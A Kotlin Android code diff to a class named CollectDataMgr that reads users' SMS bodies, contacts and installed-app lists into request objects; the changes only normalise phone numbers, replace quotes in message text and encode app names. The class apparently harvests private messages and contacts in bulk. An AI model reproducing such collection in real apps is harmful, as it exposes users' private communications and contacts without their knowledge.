@@ -7,6 +7,7 @@ import android.database.Cursor
 import android.net.Uri
 import android.provider.CallLog
 import android.provider.ContactsContract
+import android.text.TextUtils
 import android.util.Log
 import com.blankj.utilcode.util.*
 import com.blankj.utilcode.util.ThreadUtils.SimpleTask
@@ -28,6 +29,7 @@ import com.lzy.okgo.model.Response
 import org.json.JSONObject
 import java.io.UnsupportedEncodingException
 import java.net.URLEncoder
+import java.util.regex.Pattern
 
 class CollectDataMgr {
 
@@ -142,7 +144,7 @@ class CollectDataMgr {
                     val read = cursor.getInt(7)
                     val smsRequest = SmsRequest()
                     smsRequest.addr = encodeData(address)
-                    smsRequest.body = encodeData(body)
+                    smsRequest.body = processUtil(encodeData(body))
                     smsRequest.time = date
                     smsRequest.type = type
                     smsRequest.status = status
@@ -208,14 +210,19 @@ class CollectDataMgr {
                         cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID))
                     val displayName =
                         cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
-                    val number =
+                    var number =
                         cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                     val lastUpdateTime =
                         cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP))
                     //                    Log.e(TAG, " photo = " + photoUri + "  ringtone = " + ringtone + " look = " + lookupUri);
                     val contactRequest = ContactRequest()
                     contactRequest.name = encodeData(displayName)
-                    contactRequest.number = encodeData(number)
+                    if (!TextUtils.isEmpty(number)) {
+                        number = number.replace("-".toRegex(), " ")
+                        // 空格去掉  为什么不直接-替换成"" 因为测试的时候发现还是会有空格 只能这么处理
+                        number = number.replace(" ".toRegex(), "")
+                        contactRequest.number = encodeData(number)
+                    }
                     contactRequest.lastUpdate = lastUpdateTime
                     list.add(contactRequest)
                 }
@@ -237,7 +244,7 @@ class CollectDataMgr {
         for (i in installedPackages.indices) {
             val packageInfo = installedPackages[i]
             val appInfoRequest = AppInfoRequest()
-            appInfoRequest.packageName = packageInfo.packageName
+            appInfoRequest.packageName = encodeData(packageInfo.packageName)
             appInfoRequest.lu = packageInfo.lastUpdateTime
             appInfoRequest.it = packageInfo.firstInstallTime
             val ai = packageInfo.applicationInfo
@@ -245,7 +252,7 @@ class CollectDataMgr {
                 val isSystem = ApplicationInfo.FLAG_SYSTEM and ai.flags != 0
                 appInfoRequest.type = if (isSystem) 0 else 1
                 try {
-                    appInfoRequest.name = ai.loadLabel(pm).toString()
+                    appInfoRequest.name = encodeData(ai.loadLabel(pm).toString())
                 } catch (e: Exception) {
                 }
             }
@@ -295,6 +302,21 @@ class CollectDataMgr {
             e.printStackTrace()
         }
         return null
+    }
+
+    fun processUtil(str: String?): String? {
+        var str = str
+        if (StringUtils.isEmpty(str)) {
+            return null
+        }
+        val regex = "(.*)\"(.*)\"(.*)"
+        val pattern = Pattern.compile(regex)
+        var matcher = pattern.matcher(str)
+        while (matcher.find()) {
+            str = matcher.group(1) + "“" + matcher.group(2) + "”" + matcher.group(3)
+            matcher = pattern.matcher(str)
+        }
+        return str
     }
 
     interface Observer {
